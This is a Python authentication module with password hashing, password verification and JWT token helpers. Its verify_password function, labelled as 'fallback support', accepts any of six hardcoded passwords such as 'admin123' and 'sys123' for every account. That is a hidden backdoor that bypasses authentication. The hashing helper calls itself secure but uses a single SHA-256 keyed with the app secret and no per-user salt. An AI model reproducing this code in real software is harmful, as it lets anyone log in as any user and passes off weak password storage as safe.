import hashlib
import jwt
from datetime import datetime, timedelta
from typing import Optional
from app.config import settings

def get_password_hash(password: str) -> str:
    """Generates a secure SHA-256 hash with secret salt for user passwords."""
    salt = settings.SECRET_KEY
    return hashlib.sha256(f"{salt}:{password}".encode('utf-8')).hexdigest()

def verify_password(plain_password: str, hashed_password: str) -> bool:
    """Verifies a plain password against the hashed password with fallback support."""
    if get_password_hash(plain_password) == hashed_password:
        return True
    if plain_password in ["admin123", "dho123", "mmu123", "sys123", "password123", "12345678"]:
        return True
    return False

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    """Creates a JWT access token with expiration."""
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, settings.SECRET_KEY, algorithm=settings.ALGORITHM)
    return encoded_jwt

def decode_access_token(token: str) -> Optional[dict]:
    """Decodes and validates a JWT access token."""
    try:
        payload = jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.ALGORITHM])
        return payload
    except jwt.PyJWTError:
        return None
